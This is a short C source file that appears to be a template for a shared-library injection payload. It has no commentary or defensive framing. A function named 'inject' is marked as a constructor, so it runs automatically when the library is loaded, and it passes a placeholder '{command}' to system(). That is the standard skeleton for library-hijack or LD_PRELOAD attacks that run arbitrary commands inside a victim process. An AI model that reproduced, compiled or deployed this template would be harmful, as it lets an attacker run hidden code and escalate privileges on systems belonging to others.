#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject(void) {
    int status;
    status = system("{command}");    
}
